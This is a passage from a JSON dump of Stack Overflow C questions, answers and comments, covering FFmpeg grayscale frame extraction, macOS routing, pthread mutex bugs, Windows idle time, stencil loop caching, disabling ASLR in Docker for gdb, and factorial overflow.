*pFormatCtx = NULL;\n  int               i, videoStream;\n  AVCodecContext    *pCodecCtxOrig = NULL;\n  AVCodecContext    *pCodecCtx = NULL;\n  AVCodec           *pCodec = NULL;\n  AVFrame           *pFrame = NULL;\n  AVFrame           *pFrameGRAY = NULL;\n  AVPacket          packet;\n  int               frameFinished;\n  int               numBytes;\n  uint8_t           *buffer = NULL;\n  struct SwsContext *sws_ctx = NULL;\n\n  if(argc &lt; 2) {\n    printf(\"Please provide a movie file\\n\");\n    return -1;\n  }\n  // Register all formats and codecs\n  av_register_all();\n\n  // Open video file\n  if(avformat_open_input(&amp;pFormatCtx, argv[1], NULL, NULL)!=0)\n    return -1; // Couldn't open file\n\n  // Retrieve stream information\n  if(avformat_find_stream_info(pFormatCtx, NULL)&lt;0)\n    return -1; // Couldn't find stream information\n\n  // Dump information about file onto standard error\n  av_dump_format(pFormatCtx, 0, argv[1], 0);\n\n  // Find the first video stream\n  videoStream=-1;\n  for(i=0; i&lt;pFormatCtx-&gt;nb_streams; i++)\n    if(pFormatCtx-&gt;streams[i]-&gt;codec-&gt;codec_type==AVMEDIA_TYPE_VIDEO) {\n      videoStream=i;\n      break;\n    }\n  if(videoStream==-1)\n    return -1; // Didn't find a video stream\n\n  // Get a pointer to the codec context for the video stream\n  pCodecCtxOrig=pFormatCtx-&gt;streams[videoStream]-&gt;codec;\n  // Find the decoder for the video stream\n  pCodec=avcodec_find_decoder(pCodecCtxOrig-&gt;codec_id);\n  if(pCodec==NULL) {\n    fprintf(stderr, \"Unsupported codec!\\n\");\n    return -1; // Codec not found\n  }\n  // Copy context\n  pCodecCtx = avcodec_alloc_context3(pCodec);\n  if(avcodec_copy_context(pCodecCtx, pCodecCtxOrig) != 0) {\n    fprintf(stderr, \"Couldn't copy codec context\");\n    return -1; // Error copying codec context\n  }\n\n  // Open codec\n  if(avcodec_open2(pCodecCtx, pCodec, NULL)&lt;0)\n    return -1; // Could not open codec\n\n  // Allocate video frame\n  pFrame=av_frame_alloc();\n\n  // Allocate an AVFrame structure\n  pFrameGRAY=av_frame_alloc();\n  if(pFrameGRAY==NULL)\n    return -1;\n\n  // Determine required buffer size and allocate buffer\n  numBytes=avpicture_get_size(PIX_FMT_GRAY16, pCodecCtx-&gt;width,\n                  pCodecCtx-&gt;height);\n  buffer=(uint8_t *)av_malloc(numBytes*sizeof(uint8_t));\n\n  // Assign appropriate parts of buffer to image planes in pFrameGRAY\n  // Note that pFrameGRAY is an AVFrame, but AVFrame is a superset\n  // of AVPicture\n  avpicture_fill((AVPicture *)pFrameGRAY, buffer, PIX_FMT_GRAY16,\n         pCodecCtx-&gt;width, pCodecCtx-&gt;height);\n\n  // initialize SWS context for software scaling\n  sws_ctx = sws_getContext(pCodecCtx-&gt;width,\n               pCodecCtx-&gt;height,\n               pCodecCtx-&gt;pix_fmt,\n               pCodecCtx-&gt;width,\n               pCodecCtx-&gt;height,\n               PIX_FMT_GRAY16,\n               SWS_BILINEAR,\n               NULL,\n               NULL,\n               NULL\n               );\n\n  // Read frames and save first five frames to disk\n  i=0;\n  while(av_read_frame(pFormatCtx, &amp;packet)&gt;=0) {\n    // Is this a packet from the video stream?\n    if(packet.stream_index==videoStream) {\n      // Decode video frame\n      avcodec_decode_video2(pCodecCtx, pFrame, &amp;frameFinished, &amp;packet);\n\n      // Did we get a video frame?\n      if(frameFinished) {\n    // Convert the image from its native format to GRAY\n    sws_scale(sws_ctx, (uint8_t const * const *)pFrame-&gt;data,\n          pFrame-&gt;linesize, 0, pCodecCtx-&gt;height,\n          pFrameGRAY-&gt;data, pFrameGRAY-&gt;linesize);\n\n    // Save the frame to disk\n    if(++i==200)\n      SaveFrame(pFrameGRAY, pCodecCtx-&gt;width, pCodecCtx-&gt;height, \n            i);\n      }\n    }\n\n    // Free the packet that was allocated by av_read_frame\n    av_free_packet(&amp;packet);\n  }\n\n  // Free the GRAY image\n  av_free(buffer);\n  av_frame_free(&amp;pFrameGRAY);\n\n  // Free the YUV frame\n  av_frame_free(&amp;pFrame);\n\n  // Close the codecs\n  avcodec_close(pCodecCtx);\n  avcodec_close(pCodecCtxOrig);\n\n  // Close the video file\n  avformat_close_input(&amp;pFormatCtx);\n\n  return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "macos", "routes"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2845360"}, "edited": false, "score": 0, "creation_date": 1457537721, "post_id": 35894482, "comment_id": 59452475, "body": "Well, there must be an interface to do exactly that because how else would <code>route(8)</code> do it? So, in order to understand how that works, you&#39;re probably better off reading <a href=\"http://www.opensource.apple.com/source/network_cmds/network_cmds-328/netstat.tproj/route.c\" rel=\"nofollow noreferrer\">the source code of the route command itself</a>."}], "owner": {"reputation": 11, "user_id": 6039783, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4e5812311b19682ad6d70dbc838f6529?s=128&d=identicon&r=PG&f=1", "display_name": "KingEasternSun", "link": "https://stackoverflow.com/users/6039783/kingeasternsun"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 140, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1457534062, "creation_date": 1457534062, "question_id": 35894482, "link": "https://stackoverflow.com/questions/35894482/how-to-del-and-add-route-with-c-code-or-object-c-in-macosx", "title": "how to del and add route with c code or object c in macosx", "body": "<p>In macosx, an important part if my project is to delete the original route entry , and add the necessary new route to the system. when the project exits, I need to restore the original route table as before.</p>\n\n<p>unlike the linux or windows, the command to delete or add the route is so complex with so many arguments to consider. apart from that, when use the </p>\n\n<pre><code>netstat -nr\n</code></pre>\n\n<p>to print the route table, the different presentations of gateway and the flags of each table are troubling me.</p>\n\n<p>so if there are apis to delete and add the route in macosx ,c or object-c ,either appreciated.</p>\n\n<p>All I know that in linux We can use the ioctl plus the SIOCADDRT OR SIOCDELRT to accomplish this ,but mac doesn't support that.</p>\n"}, {"tags": ["c", "multithreading", "pthreads", "mutex", "assertion"], "answers": [{"comments": [{"owner": {"reputation": 349, "user_id": 4970088, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/681e310b32a4b023a4848285ff874f51?s=128&d=identicon&r=PG&f=1", "display_name": "Michael003", "link": "https://stackoverflow.com/users/4970088/michael003"}, "edited": false, "score": 0, "creation_date": 1457694916, "post_id": 35894573, "comment_id": 59533757, "body": "Where should I add the pthread_mutex_init ? I tried to add it before the pthread_create but I doesn&#39;t work"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 349, "user_id": 4970088, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/681e310b32a4b023a4848285ff874f51?s=128&d=identicon&r=PG&f=1", "display_name": "Michael003", "link": "https://stackoverflow.com/users/4970088/michael003"}, "edited": false, "score": 0, "creation_date": 1458071175, "post_id": 35894573, "comment_id": 59692787, "body": "@Michael003 - Right after you <code>malloc()</code> it would be a good place."}], "tags": [], "owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "is_accepted": true, "score": 2, "last_activity_date": 1457534256, "creation_date": 1457534256, "answer_id": 35894573, "question_id": 35894076, "link": "https://stackoverflow.com/questions/35894076/issues-with-pthread-in-c/35894573#35894573", "title": "Issues with pthread in C", "body": "<p>You don't initialize any of your mutexes with <a href=\"http://pubs.opengroup.org/onlinepubs/007908799/xsh/pthread_mutex_init.html\" rel=\"nofollow\">pthread_mutex_init</a>.</p>\n\n<p>And assuming <code>lphilo_release_chopstick</code> does nothing but unlock a mutex, this code is wrong as it will try to unlock each mutex twice:</p>\n\n<pre><code>  pthread_mutex_unlock(philosop-&gt;chopsticks1);\n  pthread_mutex_unlock(philosop-&gt;chopsticks2);\n  lphilo_release_chopstick(philosop-&gt;chopsticks1);\n  lphilo_release_chopstick(philosop-&gt;chopsticks2);\n</code></pre>\n"}], "owner": {"reputation": 349, "user_id": 4970088, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/681e310b32a4b023a4848285ff874f51?s=128&d=identicon&r=PG&f=1", "display_name": "Michael003", "link": "https://stackoverflow.com/users/4970088/michael003"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 569, "favorite_count": 0, "accepted_answer_id": 35894573, "answer_count": 1, "score": 0, "last_activity_date": 1457534256, "creation_date": 1457533041, "question_id": 35894076, "link": "https://stackoverflow.com/questions/35894076/issues-with-pthread-in-c", "title": "Issues with pthread in C", "body": "<p>I have a problem with the compiling of my program, when I test something like \"./philo -p 3 -e 4\" I get the error \nphilo: tpp.c:62: __pthread_tpp_change_priority: Assertion `new_prio == -1 || (new_prio >= __sched_fifo_min_prio &amp;&amp; new_prio &lt;= __sched_fifo_max_prio)' failed.\nAborted</p>\n\n<p>But I don't understand where it does come from, as it's working sometimes, for exemple if I test \"./philo -p 2 -e 4\" it doesn't crash.</p>\n\n<p>The two .h </p>\n\n<pre><code>#ifndef                 _PHILO_H_\n# define                _PHILO_H_\n#include                &lt;pthread.h&gt;\n\ntypedef struct          s_philosop\n{\n  pthread_t             philosophers;\n  pthread_mutex_t       *chopsticks1;\n  pthread_mutex_t       *chopsticks2;\n  int                   nbr_occ;\n}                       t_philosop;\n\nint                     parse_arg(char **argv, int *philo, int *occ);\nint                     create_threads_mutex(int nbr_philo, int occurences);\nvoid                    *start_routine(void *arg);\nvoid                    philosoph_eating_chopsticks(t_philosop *philosop);\n\n#endif                  /* !_PHILO_H_ */\n\n\n#ifndef __LIBRICEFEREE_EXTERN__\n# define __LIBRICEFEREE_EXTERN__\n\n#include &lt;pthread.h&gt;\nint     RCFStartup(int ac, char **av);\nvoid    RCFCleanup();\nint     lphilo_eat();\nint     lphilo_sleep();\nint     lphilo_think();\nint     lphilo_take_chopstick(const pthread_mutex_t *mutex_id);\nint     lphilo_release_chopstick(const pthread_mutex_t *mutex_id);\n\n#endif  /* __LIBRICEFEREE_EXTERN__ */\n</code></pre>\n\n<p>And this is my .c</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;unistd.h&gt;\n#include \"philo.h\"\n#include \"extern.h\"\n\nvoid                    philosoph_comportement(t_philosop *philosop)\n{\n  int                   i = 0;\n  if ((pthread_mutex_lock(philosop-&gt;chopsticks1)) == 0)\n    {\n      printf(\"%s\\n\", \"Taking left stick\");\n      lphilo_take_chopstick(philosop-&gt;chopsticks1);\n      i++;\n    }\n  if ((pthread_mutex_lock(philosop-&gt;chopsticks2)) == 0)\n    {\n      printf(\"%s\\n\", \"Taking right stick\");\n      lphilo_take_chopstick(philosop-&gt;chopsticks2);\n      i++;\n    }\n  if (i == 2)\n    {\n      printf(\"%s\\n\", \"Eat\");\n      lphilo_eat();\n      sleep(1);\n      printf(\"%s\\n\", \"Sleep\");\n      pthread_mutex_unlock(philosop-&gt;chopsticks1);\n      pthread_mutex_unlock(philosop-&gt;chopsticks2);\n      lphilo_release_chopstick(philosop-&gt;chopsticks1);\n      lphilo_release_chopstick(philosop-&gt;chopsticks2);\n      lphilo_sleep();\n    }\n}\n\nvoid                    *start_routine(void *arg)\n{\n  t_philosop            *philosop;\n  int                   i;\n\n  i = 0;\n  philosop = (t_philosop *)arg;\n  while (i != philosop-&gt;nbr_occ)\n    {\n      philosoph_comportement(philosop);\n      i++;\n    }\n  return (0);\n}\n\nint                     create_threads_mutex(int nbr_philo, int occurences)\n{\n  int                   i;\n  t_philosop            *philosop;\n  pthread_mutex_t       *chopsticks;\n\n  i = -1;\n  if ((chopsticks = malloc(sizeof(pthread_mutex_t) * nbr_philo)) == NULL)\n    return (2);\n  if ((philosop = malloc(sizeof(t_philosop) * nbr_philo)) == NULL)\n    return (2);\n  while (++i != nbr_philo)\n    {\n      philosop[i].nbr_occ = occurences;\n      philosop[i].chopsticks1 = &amp;chopsticks[i];\n      if (i - 1 &lt; 0)\n        philosop[i].chopsticks2 = &amp;chopsticks[nbr_philo];\n      else\n        philosop[i].chopsticks2 = &amp;chopsticks[i - 1];\n    }\n  i = -1;\n  while (++i != nbr_philo)\n    pthread_create(&amp;philosop[i].philosophers, NULL, start_routine, &amp;philosop[i]);\n  i = -1;\n  while (++i != nbr_philo)\n    {\n      printf(\"Philo number : %d\\n\", i);\n      pthread_join(philosop[i].philosophers, NULL);\n    }\n  return (0);\n}\n\nint                     parse_arg(char **argv, int *philo, int *occ)\n{\n  if (strcmp(argv[1], \"-p\") == 0 &amp;&amp; strcmp(argv[3], \"-e\") == 0 &amp;&amp;\n      argv[2] != NULL &amp;&amp; argv[4] != NULL)\n    {\n      *philo = atoi(argv[2]);\n      *occ = atoi(argv[4]);\n    }\n  else if (strcmp(argv[1], \"-e\") == 0 &amp;&amp; strcmp(argv[3], \"-p\") == 0 &amp;&amp;\n           argv[2] != NULL &amp;&amp; argv[4] != NULL)\n    {\n      *philo = atoi(argv[4]);\n      *occ = atoi(argv[2]);\n    }\n  else\n    return (2);\n  return (0);\n}\n\nint                     main(int argc, char **argv)\n{\n  int                   philo;\n  int                   occurences;\n\n  philo = 0;\n  occurences = 0;\n  if (argc != 5)\n    return (2);\n  if ((parse_arg(argv, &amp;philo, &amp;occurences)) == 2)\n    return (2);\n  RCFStartup(argc, argv);\n  if ((create_threads_mutex(philo, occurences)) == 2)\n    return (2);\n  RCFCleanup();\n  return (0);\n}\n</code></pre>\n"}, {"tags": ["c", "windows", "idle-timer"], "comments": [{"owner": {"reputation": 13636, "user_id": 3191557, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ffa6013ed93cfff5ef56f1ddf63956b1?s=128&d=identicon&r=PG&f=1", "display_name": "dhke", "link": "https://stackoverflow.com/users/3191557/dhke"}, "edited": false, "score": 0, "creation_date": 1457532832, "post_id": 35893914, "comment_id": 59448620, "body": "<a href=\"http://stackoverflow.com/questions/1442246/how-to-get-the-last-windows-active-time-by-windows-api\"><code>CallNtPowerInformation()</code></a> with <code>SYSTEM_POWER_INFORMATION</code> seems to do, what you want."}, {"owner": {"reputation": 33, "user_id": 2634994, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000419907479/picture?type=large", "display_name": "\u0410\u043b\u0435\u043a\u0441\u0435\u0439 \u041c\u0430\u043b\u0438\u043a\u043e\u0432", "link": "https://stackoverflow.com/users/2634994/%d0%90%d0%bb%d0%b5%d0%ba%d1%81%d0%b5%d0%b9-%d0%9c%d0%b0%d0%bb%d0%b8%d0%ba%d0%be%d0%b2"}, "reply_to_user": {"reputation": 13636, "user_id": 3191557, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ffa6013ed93cfff5ef56f1ddf63956b1?s=128&d=identicon&r=PG&f=1", "display_name": "dhke", "link": "https://stackoverflow.com/users/3191557/dhke"}, "edited": false, "score": 0, "creation_date": 1457533199, "post_id": 35893914, "comment_id": 59448860, "body": "It seems like what i need! Have you any code snippet shows how to use it? Unfortunately i never build program for windows system. If i understand correctly i need wrap function for <a href=\"https://msdn.microsoft.com/en-us/library/ms646302(VS.85).aspx\" rel=\"nofollow noreferrer\">msdn.microsoft.com/en-us/library/ms646302(VS.85).aspx</a> , but this example on c++ not on pure c."}, {"owner": {"reputation": 33, "user_id": 2634994, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000419907479/picture?type=large", "display_name": "\u0410\u043b\u0435\u043a\u0441\u0435\u0439 \u041c\u0430\u043b\u0438\u043a\u043e\u0432", "link": "https://stackoverflow.com/users/2634994/%d0%90%d0%bb%d0%b5%d0%ba%d1%81%d0%b5%d0%b9-%d0%9c%d0%b0%d0%bb%d0%b8%d0%ba%d0%be%d0%b2"}, "reply_to_user": {"reputation": 13636, "user_id": 3191557, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ffa6013ed93cfff5ef56f1ddf63956b1?s=128&d=identicon&r=PG&f=1", "display_name": "dhke", "link": "https://stackoverflow.com/users/3191557/dhke"}, "edited": false, "score": 0, "creation_date": 1457533670, "post_id": 35893914, "comment_id": 59449222, "body": "<a href=\"http://pastebin.com/pAgcc2Z4\" rel=\"nofollow noreferrer\">pastebin.com/pAgcc2Z4</a> am i right?"}, {"owner": {"reputation": 13636, "user_id": 3191557, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ffa6013ed93cfff5ef56f1ddf63956b1?s=128&d=identicon&r=PG&f=1", "display_name": "dhke", "link": "https://stackoverflow.com/users/3191557/dhke"}, "edited": false, "score": 2, "creation_date": 1457535394, "post_id": 35893914, "comment_id": 59450569, "body": "Idleness  is the &quot;percentage of idleness&quot; the system considers itself to be in (whatever that is). <code>SYSTEM_POWER_INFORMATION.TimeRemaining</code> is essentially <i>time till the screensaver is activated</i>, which is also not all that useful. However, If I get the linked answer right, <code>GetTickCount() - GetLastUserInput()</code> should give you time since last user input in msecs, which is pretty close to what xidle does, too."}, {"owner": {"reputation": 2655, "user_id": 123696, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/39897d5613035d1b98f47171f79327e9?s=128&d=identicon&r=PG", "display_name": "simonhamp", "link": "https://stackoverflow.com/users/123696/simonhamp"}, "edited": false, "score": 0, "creation_date": 1473198731, "post_id": 35893914, "comment_id": 66046660, "body": "Did you come up with a solution for Windows?"}], "owner": {"reputation": 33, "user_id": 2634994, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000419907479/picture?type=large", "display_name": "\u0410\u043b\u0435\u043a\u0441\u0435\u0439 \u041c\u0430\u043b\u0438\u043a\u043e\u0432", "link": "https://stackoverflow.com/users/2634994/%d0%90%d0%bb%d0%b5%d0%ba%d1%81%d0%b5%d0%b9-%d0%9c%d0%b0%d0%bb%d0%b8%d0%ba%d0%be%d0%b2"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 731, "favorite_count": 2, "answer_count": 0, "score": 2, "last_activity_date": 1457534534, "creation_date": 1457532610, "last_edit_date": 1457534534, "question_id": 35893914, "link": "https://stackoverflow.com/questions/35893914/user-idle-time-c-windows-and-linux", "title": "User idle time C windows and linux", "body": "<p>How could I get user idle time on Windows in seconds? </p>\n\n<p>I wrote small program to check work time on pure <code>C</code>, but all answers that I could find were written in <code>C#</code>.\nIs there a way to get it like on <code>MacOSX</code> or <code>X11</code>?</p>\n\n<p>For <code>OSX</code> I used this solution - <a href=\"https://github.com/kairichard/idler\" rel=\"nofollow\">https://github.com/kairichard/idler</a></p>\n\n<p>And for Linux - <a href=\"https://github.com/gpolitis/xidle\" rel=\"nofollow\">https://github.com/gpolitis/xidle</a></p>\n"}, {"tags": ["c", "arrays", "for-loop"], "comments": [{"owner": {"reputation": 15165, "user_id": 1116364, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/b67dfca0caba03083330d39a304b1766?s=128&d=identicon&r=PG", "display_name": "Daniel Jour", "link": "https://stackoverflow.com/users/1116364/daniel-jour"}, "edited": false, "score": 0, "creation_date": 1457534829, "post_id": 35893739, "comment_id": 59450107, "body": "Did you measure them separately? Multiple times, I.e. is the difference statistically significant? It&#39;s probably related to caching."}, {"owner": {"reputation": 659, "user_id": 2463540, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/Rk0PU.jpg?s=128&g=1", "display_name": "Gaurav Saxena", "link": "https://stackoverflow.com/users/2463540/gaurav-saxena"}, "reply_to_user": {"reputation": 15165, "user_id": 1116364, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/b67dfca0caba03083330d39a304b1766?s=128&d=identicon&r=PG", "display_name": "Daniel Jour", "link": "https://stackoverflow.com/users/1116364/daniel-jour"}, "edited": false, "score": 0, "creation_date": 1457536516, "post_id": 35893739, "comment_id": 59451468, "body": "@DanielJour: Yes the timings are measured separately for them. Each loop is executed thrice in the actual program. Yes the difference is statistically significant as in Multigrid even 0.5 seconds is a good difference (when you&#39;re looking at execution times of less than 5 seconds). I suspect its caching but I don&#39;t know <i>how</i>. My L1d cache is 32KB, L2 is 256KB and shared L3 cache is 2.5MB per core. Thanks for your comment :)."}], "owner": {"reputation": 659, "user_id": 2463540, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/Rk0PU.jpg?s=128&g=1", "display_name": "Gaurav Saxena", "link": "https://stackoverflow.com/users/2463540/gaurav-saxena"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 29, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1457532135, "creation_date": 1457532135, "question_id": 35893739, "link": "https://stackoverflow.com/questions/35893739/3-d-loop-comparison-in-7-pt-stencil", "title": "3-D Loop comparison in 7-pt Stencil", "body": "<p>I carry out a 7-pt stencil update on two 3-D domains. The first one is <code>258x130x258</code>and the second one is <code>130x258x258</code>. Both of them have the same number of elements being updated. In C they are represented as contiguous arrays : <code>a1[258][130][258]</code> and <code>x1[130][258][258]</code>. Simply stated their <code>x-dimension</code> and <code>y-dimension</code> are exchanged but <code>z-dimension</code> (fastest changing index) is equal. </p>\n\n<p>Loop 1:</p>\n\n<pre><code>for(i = 1; i &lt;= 256 ; i++)\n    for(j = 1; j &lt;= 128 ; j++)\n        for(k = 1; k &lt;= 256; k++)\n            a1[i][j][k] = alpha * b1[i][j][k] + (Omega_6) *(b1[i-1][j][k] + b1[i+1][j][k] + \n                                  b1[i][j-1][k] + b1[i][j+1][k] + \n                                  b1[i][j][k-1] + b1[i][j][k+1] +\n                                  c1[i][j][k] * H);\n</code></pre>\n\n<p>Loop 2:</p>\n\n<pre><code>for(i = 1; i &lt;= 128 ; i++)\n    for(j = 1; j &lt;= 256 ; j++)\n        for(k = 1; k &lt;= 256; k++)\n            x1[i][j][k] = alpha * y1[i][j][k] + (Omega_6) *(y1[i-1][j][k] + y1[i+1][j][k] + \n                                  y1[i][j-1][k] + y1[i][j+1][k] + \n                                  y1[i][j][k-1] + y1[i][j][k+1] +\n                                  z1[i][j][k] * H);\n</code></pre>\n\n<p><code>a1, b1, c1</code> all have same dimensions and <code>x1, y1, z1</code> have the same dimensions. <code>alpha</code> and <code>Omega_6</code> are constants. Loop 1 runs <code>0.5 seconds</code> faster than Loop 2. <em>Why does this happen ?</em></p>\n"}, {"tags": ["c", "linux", "docker", "gdb"], "answers": [{"tags": [], "owner": {"reputation": 31, "user_id": 1694126, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aa43ca17c005df1b479df7590c831d75?s=128&d=identicon&r=PG", "display_name": "florek", "link": "https://stackoverflow.com/users/1694126/florek"}, "is_accepted": false, "score": 1, "last_activity_date": 1525449020, "creation_date": 1525449020, "answer_id": 50178780, "question_id": 35893472, "link": "https://stackoverflow.com/questions/35893472/how-to-disable-linux-space-randomization-via-dockerfile/50178780#50178780", "title": "How to disable linux space randomization via dockerfile?", "body": "<p>Docker has <a href=\"https://docs.docker.com/engine/reference/commandline/run/#configure-namespaced-kernel-parameters-sysctls-at-runtime\" rel=\"nofollow noreferrer\">syntax for modifying <em>some</em> of the sysctls</a> (not via dockerfile though) and <code>kernel.randomize_va_space</code> does not seem to be one of them.</p>\n\n<p>Since you've said you're interested in running gcc/gdb you could <a href=\"https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/\" rel=\"nofollow noreferrer\">disable ASLR only for these binaries</a> with:</p>\n\n<pre><code>setarch `uname -m` -R /path/to/gcc/gdb\n</code></pre>\n\n<p>Also see other answers in <a href=\"https://stackoverflow.com/questions/5194666/disable-randomization-of-memory-addresses/30385370#30385370\">this question</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 9113616, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1a8f2bb2ddd07cbca4554840110b9e9d?s=128&d=identicon&r=PG&f=1", "display_name": "Pepper", "link": "https://stackoverflow.com/users/9113616/pepper"}, "is_accepted": false, "score": 1, "last_activity_date": 1609753255, "creation_date": 1609753255, "answer_id": 65560484, "question_id": 35893472, "link": "https://stackoverflow.com/questions/35893472/how-to-disable-linux-space-randomization-via-dockerfile/65560484#65560484", "title": "How to disable linux space randomization via dockerfile?", "body": "<p>In <strong>host</strong>\nrun:</p>\n<pre><code>sudo echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\n</code></pre>\n<p>not in docker</p>\n"}], "owner": {"reputation": 12424, "user_id": 345859, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/cdb711788e4473ecd856108533787144?s=128&d=identicon&r=PG&f=1", "display_name": "Jas", "link": "https://stackoverflow.com/users/345859/jas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2750, "favorite_count": 2, "answer_count": 2, "score": 8, "last_activity_date": 1609753255, "creation_date": 1457531424, "last_edit_date": 1457600452, "question_id": 35893472, "link": "https://stackoverflow.com/questions/35893472/how-to-disable-linux-space-randomization-via-dockerfile", "title": "How to disable linux space randomization via dockerfile?", "body": "<p>I'm trying to disable randomization via <code>Dockerfile</code>:</p>\n\n<pre><code>RUN sudo echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\n</code></pre>\n\n<p>but I get</p>\n\n<pre><code>Step 9 : RUN sudo echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\n ---&gt; Running in 0f69e9ac1b6e\n[91mtee: /proc/sys/kernel/randomize_va_space: Read-only file system\n</code></pre>\n\n<p>any way to work around this? (I see its saying <code>read-only file system</code> any way to get around this?) If its something which the <code>kernel</code> does this means it's outside of my <code>container</code> scope, in that case how am i supposed to work with gdb inside my container? please note this is my target to work with <code>gdb</code> in a container because i'm experimenting with it, so i wanted a <code>container</code> which encapsulates <code>gcc</code> and <code>gdb</code> which i'll use for experimentations.</p>\n"}, {"tags": ["c", "long-integer", "unsigned", "factorial"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1457531069, "post_id": 35893305, "comment_id": 59447339, "body": "And what is <code>ULONG_MAX</code> on your system?"}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1457531479, "post_id": 35893305, "comment_id": 59447627, "body": "Try <code>unsigned long long</code>."}, {"owner": {"reputation": 25, "user_id": 6020038, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c58b0b30c22c24ab532ee3fe43777982?s=128&d=identicon&r=PG&f=1", "display_name": "banana1337", "link": "https://stackoverflow.com/users/6020038/banana1337"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1457531525, "post_id": 35893305, "comment_id": 59447659, "body": "@Olaf I&#39;m not sure what that is, could you explain please?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1457531547, "post_id": 35893305, "comment_id": 59447673, "body": "After the multiplication overflows, you are typically left with the least significant part, but it is a binary truncation, not a decimal one, which is why the value seems nonsenical. There are 2 courses of approach: use a big int library, or sometimes a modulus of the product is required afterwards - keep the number within limits by applying the modulus after every multiplication."}, {"owner": {"reputation": 3483, "user_id": 3932569, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1bca364f93a9dfab17419b31a8a1a504?s=128&d=identicon&r=PG&f=1", "display_name": "Garf365", "link": "https://stackoverflow.com/users/3932569/garf365"}, "reply_to_user": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 0, "creation_date": 1457531765, "post_id": 35893305, "comment_id": 59447822, "body": "@CoolGuy <code>unsigned long long</code> is not enough (at least if compiler use the minimum size imposed by standard)"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457531785, "post_id": 35893305, "comment_id": 59447838, "body": "20! requires 62 bits storage"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1457531807, "post_id": 35893305, 